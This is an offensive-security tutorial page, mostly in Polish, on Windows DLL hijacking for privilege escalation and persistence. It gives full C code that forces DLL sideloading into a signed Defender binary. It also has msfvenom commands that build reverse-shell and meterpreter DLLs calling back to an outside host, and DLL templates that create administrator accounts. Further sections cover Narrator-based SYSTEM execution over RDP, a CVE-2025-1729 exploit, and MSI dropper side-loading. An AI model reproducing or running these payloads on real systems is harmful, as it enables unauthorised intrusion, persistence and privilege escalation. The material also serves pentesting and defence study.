# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji, aby załadowała złośliwą DLL. Termin obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest to wykorzystywane głównie do code execution, osiągania persistence i, rzadziej, privilege escalation. Pomimo że tutaj skupiamy się na escalation, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

Istnieje kilka metod stosowanych przy DLL hijackingu, z różną skutecznością zależnie od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Zamiana prawdziwej DLL na złośliwą, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnej DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed prawidłową wersją, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Stworzenie złośliwej DLL, którą aplikacja załaduje, sądząc że jest to wymagana, ale nieistniejąca DLL.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwej DLL.
5. **WinSxS DLL Replacement**: Podmiana prawidłowej DLL na złośliwą w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika razem ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

## Znajdowanie brakujących DLL

Najczęstszym sposobem znalezienia brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) ze sysinternals i ustawienie **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

a następnie pokazanie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, zostaw to działające przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, powinieneś dodać inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać przechwytywanie zdarzeń.

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, najlepszą szansą jest możliwość zapisania DLL, którą proces działający z wyższymi uprawnieniami spróbuje załadować, w jednym z miejsc, gdzie będzie ona wyszukiwana. W praktyce oznacza to możliwość zapisania DLL w folderze, który jest przeszukiwany przed folderem zawierającym oryginalną DLL (rzadki przypadek), lub zapisania jej w folderze, w którym DLL będzie wyszukiwana, a oryginalna DLL nie istnieje w żadnym folderze.

### Kolejność wyszukiwania DLL

W dokumentacji [Microsoft](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) można znaleźć szczegółowy opis, jak DLL są ładowane.

Aplikacje Windows szukają DLL, podążając za zestawem z góry zdefiniowanych ścieżek wyszukiwania, w określonej kolejności. Problem DLL hijackingu pojawia się, gdy złośliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów tak, że zostanie załadowana przed autentyczną DLL. Rozwiązaniem jest upewnienie się, że aplikacja używa ścieżek bezwzględnych przy odwoływaniu się do wymaganych przez siebie DLL.

Poniżej znajduje się domyślna kolejność wyszukiwania DLL na systemach 32-bitowych:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji, która pobiera ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zauważ, że nie obejmuje to ścieżki specyficznej dla aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Kiedy jest wyłączony, bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie włączone).

Jeśli funkcja [LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z flagą **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zwróć uwagę, że DLL może być załadowana podając ścieżkę bezwzględną zamiast samej nazwy. W takim przypadku ta DLL będzie szukana tylko w tej ścieżce (jeśli DLL ma zależności, będą one wyszukiwane tak, jakby były załadowane po nazwie).

Istnieją też inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowaną DLL po nazwie (bez ścieżki bezwzględnej i bez użycia bezpiecznych flag ładowania), może zostać zmuszony do załadowania złośliwej DLL z tego katalogu.

Key idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na katalog kontrolowany przez Ciebie (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy binarny rozwiąże DLL po nazwie, loader uwzględni dostarczony DllPath podczas rozwiązywania, co umożliwi niezawodne sideloading nawet wtedy, gdy złośliwa DLL nie jest współlokowana z docelowym EXE.

Notes/limitations
- To wpływa na tworzony proces potomny; różni się to od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths nie mogą być hijackowane. Forwarded exports i SxS mogą zmieniać priorytety.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie DLL sideloading poprzez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub działający jako proxy do oryginalnego) w swoim katalogu DllPath.
- Uruchom podpisany binarny plik wykonywalny, który znany jest z wyszukiwania xmllite.dll po nazwie przy użyciu powyższej techniki. Loader rozwiązuje import za pomocą podanego DllPath i sideloaduje twoją DLL.

Technika ta była obserwowana in-the-wild do tworzenia wieloetapowych łańcuchów sideloading: początkowy launcher upuszcza pomocniczy DLL, który następnie uruchamia podpisaną przez Microsoft, hijackowalną binarkę z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu staging.


#### Exceptions on dll search order from Windows docs

W dokumentacji Windows wymienione są pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany jest **DLL, który dzieli nazwę z innym już załadowanym w pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego wykonuje sprawdzenie przekierowania i manifestu, zanim domyślnie użyje DLL już znajdującego się w pamięci. **W tym scenariuszu system nie przeprowadza wyszukiwania DLL**.
- W przypadkach, gdy DLL jest rozpoznawany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji tego known DLL, wraz z wszelkimi jego zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLLs.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL jest przeprowadzane tak, jakby były wskazane tylko przez ich **nazwy modułów**, niezależnie od tego, czy początkowy DLL był wskazany pełną ścieżką.

### Escalating Privileges

**Requirements**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch poziomy lub boczny), któremu **brakuje DLL**.
- Upewnij się, że dostępne są **uprawnienia zapisu** dla dowolnego **katalogu**, w którym **DLL** będzie **wyszukiwany**. Lokalizacja ta może być katalogiem pliku wykonywalnego lub katalogiem w ścieżce systemowej.

Tak, wymagania są trudne do spełnienia, ponieważ **domyślnie dość rzadko zdarza się znaleźć uprzywilejowany plik wykonywalny pozbawiony DLL** i jeszcze **rzadziej mieć uprawnienia zapisu do folderu na ścieżce systemowej** (domyślnie nie masz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest bypass UAC**, możesz tam znaleźć **PoC** Dll hijacking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny poradnik jak **abuse Dll Hijacking to escalate privileges** mając uprawnienia do zapisu w **folderze w systemowym PATH**, sprawdź:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w systemowym PATH.\
Inne przydatne zautomatyzowane narzędzia do wykrycia tej podatności to **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeśli znajdziesz scenariusz podatny na exploit, jedną z najważniejszych rzeczy potrzebnych do pomyślnego wykorzystania będzie **utworzenie dll, który eksportuje przynajmniej wszystkie funkcje, które plik wykonywalny zaimportuje z niego**. Zauważ też, że Dll Hijacking przydaje się do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Możesz znaleźć przykład **how to create a valid dll** w tym studium dotyczącym dll hijacking skoncentrowanym na wykonaniu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ponadto, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll eksportującej nieobowiązkowe funkcje**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolny do **uruchomienia twojego złośliwego kodu po załadowaniu**, ale także do **udostępniania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać plik wykonywalny i wybrać bibliotekę, którą chcesz proxify, aby wygenerować proxified dll, albo wskazać samą Dll i wygenerować proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Zwróć uwagę, że w kilku przypadkach Dll, który kompilujesz, musi **export several functions**, które zostaną załadowane przez victim process; jeśli tych funkcji nie ma, **binary won't be able to load** ich i **exploit will fail**.

<details>
<summary>Szablon C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna DLL w C z punktem wejścia w wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przewidywalną, specyficzną dla języka localization DLL przy uruchomieniu, która może zostać hijacked w celu arbitrary code execution and persistence.

Kluczowe fakty
- Ścieżka sprawdzania (obecne buildy): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ścieżka legacy (starsze buildy): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli zapisywalny plik DLL kontrolowany przez atakującego znajduje się w ścieżce OneCore, zostanie załadowany i wykona się `DllMain(DLL_PROCESS_ATTACH)`. Eksporty nie są wymagane.

Odkrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny plik DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Studium przypadku: CVE-2025-1729 — eskalacja uprawnień z użyciem TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementacja exploita

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik upuść `hostfxr.dll` do `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w momencie wykonania zadania, złośliwy DLL uruchamia się w sesji administratora na poziomie medium integrity.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia z poziomu medium integrity do uprawnień SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- Użytkownik pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), rekonstruując następny etap z osadzonych zasobów.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Szukaj wpisów uruchamiających executables lub VBScript. Przykład podejrzanego wzorca: LaunchApplication uruchamiający osadzony plik w tle.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez VBScript CustomAction. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading with wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalnie podpisany host (Avast). Proces próbuje załadować wsc.dll według nazwy z tego katalogu.
- wsc.dll: attacker DLL. Jeśli nie są wymagane żadne konkretne eksporty, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań związanych z eksportami użyj frameworku proxy (np. DLLirant/Spartacus) do wygenerowania forwarding DLL, który dodatkowo uruchamia twój payload.

- Ta technika opiera się na rozpoznawaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek absolutnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS oraz forwarded exports mogą wpływać na priorytet i należy je uwzględnić przy wyborze pliku binarnego hosta oraz zestawu eksportów.

## Referencje

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
